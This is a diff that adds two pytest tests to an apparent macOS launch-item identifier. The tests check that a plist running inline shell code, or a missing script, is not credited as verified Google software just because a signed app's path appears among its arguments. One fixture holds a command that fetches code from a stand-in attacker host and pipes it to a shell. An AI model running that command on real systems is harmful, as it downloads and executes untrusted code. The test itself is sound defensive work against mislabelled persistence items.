@@ -158,6 +158,32 @@ def test_plist_with_shell_interpreter_attributes_the_script(tmp_path):
     assert m.how == "script" and m.verified is False  # not "Apple": bash is just the runner
 
 
+def test_inline_shell_code_is_not_credited_to_a_signed_app_in_its_arguments(tmp_path):
+    # /bin/sh -c "<attacker code>" <path to a signed app>: what runs is the
+    # inline code. Crediting the first existing path would show "Made by
+    # Google LLC (verified)" for an attacker's command.
+    signed = tmp_path / "Chrome"
+    signed.write_bytes(b"\xcf\xfa\xed\xfe")
+    pl = tmp_path / "x.plist"
+    pl.write_bytes(plistlib.dumps({"ProgramArguments": [
+        "/bin/sh", "-c", "curl -s https://evil.example/x | sh", str(signed)]}))
+    m = mac({("codesign",): CHROME}).identify(str(pl))
+    assert m is not None and m.verified is False
+    assert m.name != "Google LLC"
+
+
+def test_only_the_script_position_is_credited_not_later_arguments(tmp_path):
+    # python3 <missing script> <signed binary>: the script is what runs; a
+    # signed file passed as its argument must not lend it a maker.
+    signed = tmp_path / "Chrome"
+    signed.write_bytes(b"\xcf\xfa\xed\xfe")
+    pl = tmp_path / "x.plist"
+    pl.write_bytes(plistlib.dumps({"ProgramArguments": [
+        "/usr/bin/python3", str(tmp_path / "gone.py"), str(signed)]}))
+    m = mac({("codesign",): CHROME}).identify(str(pl))
+    assert m is None or (m.verified is False and m.name != "Google LLC")
+
+
 def test_plist_with_program_key(tmp_path):
     exe = tmp_path / "d"
     exe.write_bytes(b"\xcf\xfa\xed\xfe")
